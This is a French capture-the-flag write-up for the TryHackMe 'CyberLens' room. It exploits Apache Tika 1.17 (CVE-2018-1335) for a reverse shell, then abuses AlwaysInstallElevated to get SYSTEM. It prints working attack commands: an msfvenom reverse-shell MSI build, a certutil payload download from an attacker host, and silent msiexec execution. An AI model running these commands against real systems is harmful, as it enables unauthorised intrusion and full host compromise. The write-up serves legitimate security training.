---
date: 2024-06-19T14:37:09-05:00
# description: ""
image: "/images/THM-CyberLens/CyberLens.svg"
showTableOfContents: true
tags: ["TryHackMe"]
categories: ["Writeups"]
title: "THM: CyberLens"
type: "post"
---

* Platforme: TryHackMe
* Lien: [CyberLens](https://tryhackme.com/r/room/cyberlensp6)
* Niveau: Facile
* OS: Windows
---

CyberLens présente un site web avec une fonction d'extraction de métadonnées. Après notre énumération, nous découvrons que cette fonction utilise Apache Tika, une version obsolète du logiciel vulnérable au `CVE-2018-1335` est installée. Nous obtenons notre accès initial en exploitant cette vulnérabilité. Pour l'escalade des privilèges, nous abusons de `AlwaysInstallElevated` pour obtenir un shell système.

## Balayage

Nous utiliserons un script Bash pour automatiser le balayage. Vous pouvez le trouver [ici](https://github.com/K-Scorpio/scripts-collection/blob/main/nmap_scan.sh).

Le script va :
* Scanner une IP cible pour les ports ouverts
* Les extraire
* Exécuter un scan détaillé sur les ports ouverts trouvés et sauvegarder le résultat dans trois formats différents (.gnmap, .nmap, et .xml)

```shell
Running detailed scan on open ports: 80,135,139,445,3389,5985,47001,49664,49665,49667,49668,49669,49670,49677,61777
Starting Nmap 7.94SVN ( https://nmap.org ) at 2024-06-19 15:27 CDT
Nmap scan report for 10.10.212.189
Host is up (0.23s latency).

PORT      STATE SERVICE       VERSION
80/tcp    open  http          Apache httpd 2.4.57 ((Win64))
| http-methods: 
|_  Potentially risky methods: TRACE
|_http-title: CyberLens: Unveiling the Hidden Matrix
|_http-server-header: Apache/2.4.57 (Win64)
135/tcp   open  msrpc         Microsoft Windows RPC
139/tcp   open  netbios-ssn   Microsoft Windows netbios-ssn
445/tcp   open  microsoft-ds?
3389/tcp  open  ms-wbt-server Microsoft Terminal Services
|_ssl-date: 2024-06-19T20:27:52+00:00; -20s from scanner time.
| rdp-ntlm-info: 
|   Target_Name: CYBERLENS
|   NetBIOS_Domain_Name: CYBERLENS
|   NetBIOS_Computer_Name: CYBERLENS
|   DNS_Domain_Name: CyberLens
|   DNS_Computer_Name: CyberLens
|   Product_Version: 10.0.17763
|_  System_Time: 2024-06-19T20:27:42+00:00
| ssl-cert: Subject: commonName=CyberLens
| Not valid before: 2024-06-18T19:35:16
|_Not valid after:  2024-12-18T19:35:16
5985/tcp  open  http          Microsoft HTTPAPI httpd 2.0 (SSDP/UPnP)
|_http-server-header: Microsoft-HTTPAPI/2.0
|_http-title: Not Found
47001/tcp open  http          Microsoft HTTPAPI httpd 2.0 (SSDP/UPnP)
|_http-title: Not Found
|_http-server-header: Microsoft-HTTPAPI/2.0
49664/tcp open  msrpc         Microsoft Windows RPC
49665/tcp open  msrpc         Microsoft Windows RPC
49667/tcp open  msrpc         Microsoft Windows RPC
49668/tcp open  msrpc         Microsoft Windows RPC
49669/tcp open  msrpc         Microsoft Windows RPC
49670/tcp open  msrpc         Microsoft Windows RPC
49677/tcp open  msrpc         Microsoft Windows RPC
61777/tcp open  http          Jetty 8.y.z-SNAPSHOT
|_http-title: Welcome to the Apache Tika 1.17 Server
|_http-cors: HEAD GET
| http-methods: 
|_  Potentially risky methods: PUT
|_http-server-header: Jetty(8.y.z-SNAPSHOT)
Service Info: OS: Windows; CPE: cpe:/o:microsoft:windows

Host script results:
| smb2-time: 
|   date: 2024-06-19T20:27:43
|_  start_date: N/A
|_clock-skew: mean: -20s, deviation: 0s, median: -21s
| smb2-security-mode: 
|   3:1:1: 
|_    Message signing enabled but not required

Service detection performed. Please report any incorrect results at https://nmap.org/submit/ .
Nmap done: 1 IP address (1 host up) scanned in 70.15 seconds
```

## Enumération

En visitant l'adresse IP cible, nous trouvons un site web avec une fonction de téléchargement. Nous pouvons télécharger un fichier pour extraire ses métadonnées.

![CyberLens website](/images/THM-CyberLens/cyberlens-website.png)

Après avoir capturé la requête que nous obtenons lorsque nous cliquons sur `Get Metadata`, nous constatons que le serveur web effectue une requête vers le port `61777`.

![Request to port 61777](/images/THM-CyberLens/port-for-request.png)

En accédant au port, nous arrivons à une page web présentant Apache Tika 1.17.

![Apache Tika Server](/images/THM-CyberLens/Apache-Tika.png)

**Il est possible de résoudre ce défi entièrement via Metasploit, cet article présentera la méthode manuelle et la méthode Metasploit.**

## Exploitation manuelle

### Accès initial

Une recherche sur "Apache Tika 1.17 rce" nous conduit à [ce](https://rhinosecuritylabs.com/application-security/exploiting-cve-2018-1335-apache-tika/) article de Rhino Security Labs présentant le CVE-2018-1335. Un PoC est également disponible [ici](https://github.com/RhinoSecurityLabs/CVEs/blob/master/CVE-2018-1335/CVE-2018-1335.py). Pour l'utiliser, nous devons suivre cet exemple :

```
python3 CVE-2018-1335.py <host> <port> <command>
```

Puisque nous ciblons une machine Windows, nous pouvons utiliser PowerShell pour obtenir un reverse shell.

> Sur [revshells.com](https://www.revshells.com/), nous utilisons un reverse shell PowerShell #3 (base64)

```
python3 CVE-2018-1335.py <Target_IP> <PORT_NUMBER> <INSERT REVSHELL HERE>
```
Après exécution de notre commande, nous obtenons une connexion sur notre listener, nous avons un shell en tant qu'utilisateur `cyberlens`.

![Apache Tika Server](/images/THM-CyberLens/initial-foothold.png)

Nous trouvons le fichier `user.txt` sur le bureau de l'utilisateur.

![user.txt location](/images/THM-CyberLens/user-flag.png)

### Elévation de Privilèges

Pour l'énumération du système, nous utilisons [WinPEAS](https://github.com/peass-ng/PEASS-ng/tree/master/winPEAS) et nous découvrons que `AlwaysInstallElevated` est activé.

![Winpeas finds AlwaysInstallElevated is enabled](/images/THM-CyberLens/AlwaysInstallElevated.png)

Le paramètre `AlwaysInstallElevated` de Windows est un paramètre de stratégie de groupe qui, lorsqu'il est activé, permet à Windows Installer d'installer des programmes avec des privilèges élevés (c'est-à-dire des droits d'administration), quel que soit le niveau de privilège actuel de l'utilisateur. Ce paramètre est contrôlé par deux clés de registre:

1. **HKEY_LOCAL_MACHINE\Software\Policies\Microsoft\Windows\Installer\AlwaysInstallElevated**
2. **HKEY_CURRENT_USER\Software\Policies\Microsoft\Windows\Installer\AlwaysInstallElevated**

Si ces deux clés de registre ont la valeur "1", cela signifie que n'importe quel utilisateur, y compris ceux qui n'ont que des privilèges d'utilisateur standard, peut installer des packages MSI avec des privilèges élevés (administrateur). *Vous pouvez en savoir plus à ce sujet [ici](https://book.hacktricks.xyz/windows-hardening/windows-local-privilege-escalation#alwaysinstallelevated).*

[Cet article](https://juggernaut-sec.com/alwaysinstallelevated/#Abusing_AlwaysInstallElevated_to_Obtain_a_SYSTEM_Shell) explique comment abuser de `AlwaysInstallElevated` pour obtenir un Shell SYSTEM.

1. Nous créons un fichier msi malveillant

```
msfvenom -p windows/x64/shell_reverse_tcp LHOST=10.2.104.130 LPORT=1234 -a x64 --platform Windows -f msi -o evil.msi
```

![Malicious msi ile created with msfvenom](/images/THM-CyberLens/malicious-msi.png)

2. Ensuite, nous le téléchargeons sur la cible 

```
certutil.exe -urlcache -split -f http://IP_ADDRESS:PORT_NUMBER/evil.msi evil.msi
```

3. Nous exécutons le fichier msi

```
msiexec /quiet /qn /i evil.msi
```

4. Finalement nous obtenons une connexion sur notre listener en tant que `nt authority\system`.

![System shell](/images/THM-CyberLens/system-shell.png)

Nous trouvons le fichier `admin.txt` sur le bureau de l'administrateur.

![System shell](/images/THM-CyberLens/root-flag-manual.png)

---

## Méthode Metasploit

### Accès initial

Nous avons le nom du logiciel, donc nous cherchons des exploits dans Metasploit.

Nous trouvons un exploit pour `Header Command Injection`.

![Metasploit fins exploit for Apache Tika](/images/THM-CyberLens/apache-tika-exploit.png)

> Assurez-vous de définir toutes les options correctement. Le port distant (RPORT) doit être `61777`.

Après avoir exécuté le module, nous obtenons un shell meterpreter.

![Meterpreter shell](/images/THM-CyberLens/meterpreter-shell.png)

### Elévation de Privilèges

Pour élever nos privilèges, nous pouvons utiliser le `exploit_suggester` de Metasploit afin de trouver des pistes.

> Vous pouvez mettre en arrière-plan le shell meterpreter actuel avec `background`

![Metasploit exploit suggester for privilege escalation](/images/THM-CyberLens/metasploit-privesc.png)

Il suffit de fournir un numéro de session et d'exécuter le module.

![Metasploit - Exploit suggester module use](/images/THM-CyberLens/exploit-suggester.png)

Le module trouve cinq possibilités d'exploitation pour notre cible.

![Exploits list found by exploit suggester in Metasploit](/images/THM-CyberLens/exploits-list.png)

Normalement, nous devrions les essayer toutes, mais nous savons que notre cible est vulnérable à `AlwaysInstallElevated`.

```
use exploit/windows/local/always_install_elevated
```

Nous devons fournir un numéro de session, un hôte local et un port local.

![AlwaysInstallElevated exploit in Metasploit](/images/THM-CyberLens/installed-elevated-exploit.png)

Après avoir exécuté le module, nous obtenons une session meterpreter élevée en tant que `NT AUTHORITY\SYSTEM`.

![Meterpreter system shell](/images/THM-CyberLens/admin-shell.png)

## Mots de Fin

Si vous êtes un professionnel de la cybersécurité en devenir, la maîtrise de Metasploit vous sera d'une grande utilité. Vous trouverez ci-dessous deux ressources qui vous seront utiles :
* [Metasploit Unleashed](https://www.offsec.com/metasploit-unleashed/) - Un cours gratuit d'Offensive Security qui vous apprend à utiliser le framework de manière approfondie.
* [Metasploit: The Penetration Tester's Guide](https://www.amazon.com/Metasploit-Penetration-Testers-David-Kennedy/dp/159327288X) - Ce livre date de 2011, mais il vous permettra d'approfondir votre compréhension de Metasploit. Si vous l'appréciez, sachez que la deuxième édition sortira en novembre 2024.
